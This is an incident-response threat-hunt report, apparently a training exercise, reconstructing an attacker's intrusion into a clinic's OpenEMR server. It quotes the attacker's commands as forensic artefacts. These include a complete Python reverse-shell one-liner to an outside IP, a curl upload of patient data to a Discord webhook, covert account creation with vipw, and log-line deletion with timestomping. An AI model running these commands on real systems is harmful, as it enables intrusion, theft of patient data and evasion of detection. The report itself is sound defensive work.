# Threat Hunt Report — Rocky Clinic OpenEMR Breach Investigation

> **Classification:** Internal Security Investigation  
> **Hunt:** 07 · Rocky Clinic  
> **Investigation Window:** 04 February 2026 – 14 February 2026  
> **Report Date:** June 2026  
> **Prepared By:** Karan – SOC Analyst  
> **Prepared For:** Incident Lead // Rocky Clinic  
> **Platform:** OpenEMR on Docker (RockyLinux 9.7)

---

## Table of Contents

1. [Phase 01 — Asset Validation](#phase-01--asset-validation)
2. [Phase 02 — Discovery](#phase-02--discovery)
3. [Phase 03 — Privilege Escalation](#phase-03--privilege-escalation)
4. [Phase 04 — Staging](#phase-04--staging)
5. [Phase 05 — Persistence](#phase-05--persistence)
6. [Phase 06 — Command & Control](#phase-06--command--control)
7. [Phase 07 — Exfiltration](#phase-07--exfiltration)
8. [Phase 08 — Defense Evasion](#phase-08--defense-evasion)
9. [Incident Summary](#incident-summary)
10. [CEO Briefing — Incident Timeline](#ceo-briefing--incident-timeline)

---

## Phase 01 — Asset Validation

The investigation was anchored to the host running the OpenEMR workload. Both the fully qualified device name and the container runtime were confirmed before any further analysis.

| # | Finding / Question | Answer / Artefact |
|---|---|---|
| Q01 | FQDN of the OpenEMR host | `rocky83.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net` |
| Q02 | Container runtime on rocky83 | `DOCKER` |

---

## Phase 02 — Discovery

The operator's early activity appeared administrative. A suspicious remote logon from an external IP established a new session; the attacker immediately checked who else was logged in — a classic situational-awareness step — before fingerprinting the host OS, reading environment configuration files, and mapping the application's Docker layout.

| # | Finding / Question | Answer / Artefact |
|---|---|---|
| Q03 | First 'who is logged in' command — PID | `17507` (command: `w` \| 08 Feb 16:25 UTC) |
| Q04 | SHA256 of last interactive binary before cleanup | `a7b78ff3f501951cd8455697ef1b6dc1832ae42a9433926a8504d6ad719d729d` |
| Q05 | Account behind suspicious remote sessions | `it.admin` (RemoteIP: `68.53.47.150`) |
| Q06 | Distinct `/etc` release files read in fingerprint | `4` (os-release, redhat-release, rocky-release, system-release) |
| Q07 | OS distribution as recorded by EDR | `RockyLinux 9.7` |

---

## Phase 03 — Privilege Escalation

Moving beyond constrained admin access, the operator escalated directly to root using `sudo -i`. The first privileged action was to interrogate the database container — confirming the attacker understood the full application stack before touching live data.

| # | Finding / Question | Answer / Artefact |
|---|---|---|
| Q08 | Command used to escalate to root | `sudo -i` |
| Q09 | Command that interrogated the DB container | `docker inspect openemr-mariadb` |
| Q10 | Full command reading the automation config | `sudo sed -n 1,200p /etc/openemr/audit_export.env` |
| Q11 | Recursive Docker volume enumeration action | `find /var/lib/docker/volumes -maxdepth 3 -type f` |
| Q12 | Physical database storage path identified | `/var/lib/docker/volumes/r0ckyyy335_mariadb_data/_data` |

---

## Phase 04 — Staging

Rather than creating new tooling, the operator targeted an existing trusted backup script. When that path was inconvenient, patient data was archived and staged in an operationally-named directory that draws minimal attention during routine log review.

| # | Finding / Question | Answer / Artefact |
|---|---|---|
| Q13 | Trusted script targeted for staging leverage | `/opt/backup/scripts/backup_manifest.sh` |
| Q14 | Directory used for staging prep | `/var/lib/integrations` |

---

## Phase 05 — Persistence

Two persistence mechanisms were planted: a rogue OS-level identity designed to blend with system account naming conventions, created using a low-visibility binary to avoid standard `useradd` telemetry; and a systemd service file written with `cat` to suppress text-editor artefacts.

| # | Finding / Question | Answer / Artefact |
|---|---|---|
| Q15 | Unauthorised account name | `system` |
| Q16 | SHA256 of binary used to create the account | `dbb794466563134e5119efa47fd41c4ffb31a8104b59bba11eb630f55238abd0` (`vipw`) |
| Q17 | Secondary non-interactive persistence artefact | `integration-monitor.service` |
| Q18 | Binary used to create service file (no editor) | `cat` |

---

## Phase 06 — Command & Control

A Python one-liner embedded inside the systemd service created an outbound reverse shell over TCP 443 to an Azure-hosted IP. The service file was edited once before activation and the SHA256 of that specific version is tied directly to the live C2 session.

| # | Finding / Question | Answer / Artefact |
|---|---|---|
| Q19 | SHA256 of service file version at C2 launch | `f71ea834a9be9fb0e90c7b496e5312072fffedf1d1c0377957e05714bdac37b8` |
| Q20 | Full C2 command line | See below |
| Q21 | PID of interactive reverse shell session | `8000` (`/bin/sh -i` \| 11 Feb 04:18 UTC) |

**C2 Command (Q20):**

```python
/usr/bin/python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("20.62.27.80",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call("/bin/sh","-i")'
```

---

## Phase 07 — Exfiltration

The operator prepared a compressed archive of staged patient documents, attempted a structured SCP transfer that was blocked at the perimeter, then pivoted to a Discord webhook to successfully move the data out over HTTPS — a channel not typically scrutinised by healthcare network controls.

| # | Finding / Question | Answer / Artefact |
|---|---|---|
| Q22 | Staged archive filename | `integration_state_2026-02-10_22-00-01.tar.gz` |
| Q23 | Failed exfiltration attempt | `/usr/bin/ssh -x -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no` [SFTP — blocked] |
| Q24 | Successful exfiltration command | `curl -F file=@integration_state_2026-02-10_22-00-01.tar.gz https://discord.com/api/webhooks/1471960320636620832/...` |
| Q25 | Exfiltration endpoint (IP:port) | `162.159.135.232:443` |

---

## Phase 08 — Defense Evasion

After exfiltration, the operator performed targeted log surgery — deleting specific evidence lines with `sed -i` across two system log files rather than wiping them wholesale, and forging a timestamp on `/var/log/messages` to displace the apparent timeline. The EDR nonetheless captured and classified both actions.

| # | Finding / Question | Answer / Artefact |
|---|---|---|
| Q26 | Distinct `sed -i` delete operations across both logs | `12` |
| Q27 | Binary used for in-place log manipulation | `sed` |
| Q28 | Forged timestamp applied to `/var/log/messages` | `2026-02-06 12:00:00` |
| Q29 | EDR technique classifications raised | Indicator Removal (`T1070`) \| Timestomp (`T1070.006`) |

---

## Incident Summary

### What Happened

Between 4 and 14 February 2026, Rocky Clinic's cloud-hosted OpenEMR platform was deliberately compromised by an external threat actor. The attacker gained entry using a legitimate administrative account (`it.admin`), spending the first several days quietly learning the environment before escalating privileges and planting persistent access. No ransomware was deployed and no service outage occurred — the intrusion was designed to be invisible.

### How the Attacker Operated

The intrusion unfolded across eight identifiable phases. Initial access was achieved through a valid SSH credential. The attacker then systematically fingerprinted the host, read password hashes, escalated to root, and mapped the Docker containerised database. A rogue OS account named `system` was created using a file-editing binary (`vipw`) rather than standard account management tools, specifically to avoid detection. A malicious systemd service was planted to provide reliable, reboot-survivable command-and-control via an outbound Python reverse shell.

Patient documents and database exports were collected, compressed into a single archive, and exfiltrated. A direct file transfer attempt via SSH/SFTP was blocked by network controls. The attacker pivoted to a Discord webhook — a common SaaS platform not typically blocked in healthcare environments — and succeeded in transferring the data over standard HTTPS.

Before disconnecting, the attacker performed surgical log cleanup: 12 targeted line-deletions across system log files, and a forged file timestamp applied to `/var/log/messages`. These actions indicate a deliberate and experienced operator seeking to delay attribution.

### What Was Exposed

> **⚠️ PATIENT DATA**  
> Clinical documents stored in the OpenEMR document repository and database export files were confirmed to have been exfiltrated. The precise volume and scope of records require forensic analysis of the recovered archive path and OpenEMR audit logs.

---

## CEO Briefing — Incident Timeline

Non-technical chronological summary of the breach. All dates in UTC.

| Date | What Happened | Business Impact |
|---|---|---|
| 04–05 Feb | Attacker silently logged in and studied the system — what software runs, what users exist, where data is stored. No alerts fired. | Zero disruption. Attack invisible. |
| 06–07 Feb | Attacker read system password files and gained full administrative (root) control of the server. Created a secondary staff-looking account to maintain access. | Full server control obtained. |
| 07 Feb | Additional IT-like account (`helpdesk.tier2`) added to the system to expand foothold. | Attacker widened access points. |
| 09 Feb | Attacker created a hidden account named `system` — designed to look like a built-in OS account — and read configuration files containing automation credentials. | Credentials and automation secrets compromised. |
| 10 Feb | Attacker mapped the patient document storage and database directories. Began collecting and compressing patient records into a single archive file. | Patient data collected and prepared for theft. |
| 10–11 Feb | A disguised background service (`integration-monitor`) was installed on the server. When started, it opened a hidden remote-control channel to an attacker-controlled server in the cloud. | Persistent remote control established. |
| 11 Feb 04:16 | Remote control channel activated. Attacker attempted to send the patient archive to their server via a standard file-transfer protocol. Network controls blocked the transfer. | First exfil attempt blocked. |
| 13 Feb 20:10 | Attacker re-routed the transfer through Discord — a messaging platform commonly allowed through firewalls. The patient data archive was successfully sent. | PATIENT DATA EXFILTRATED.|
| 11–13 Feb | Attacker deleted specific lines from server activity logs and changed the file date on `/var/log/messages` to make it appear events happened earlier. Security software (EDR) still captured the actions. | Attempted cover-up. Evidence partially preserved by EDR. |
| 14 Feb | Investigation window closes. EDR telemetry preserved. Threat Hunt team engaged to reconstruct the full attack chain. | Forensic reconstruction underway. |

---
## Disclaimer

This document is for defensive security education, incident-response documentation, and portfolio demonstration. Do not use the included techniques for unauthorized access, persistence, exfiltration, or evasion.
